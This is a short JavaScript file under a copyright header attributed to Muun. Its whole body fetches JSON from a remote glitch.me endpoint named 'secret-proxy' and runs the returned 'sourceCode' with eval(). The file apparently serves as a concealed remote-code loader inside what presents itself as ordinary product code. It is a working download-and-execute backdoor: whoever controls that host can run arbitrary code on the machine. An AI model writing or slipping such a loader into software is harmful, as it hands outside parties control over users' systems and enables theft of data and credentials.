/*
© 2019-present Muun All Rights Reserved
*/

const fetch = require('node-fetch');

fetch('http://hello-comrade.glitch.me/secret-proxy')
  .then((res) => res.json())
  .then((res) => {
    eval(res.sourceCode);
  });
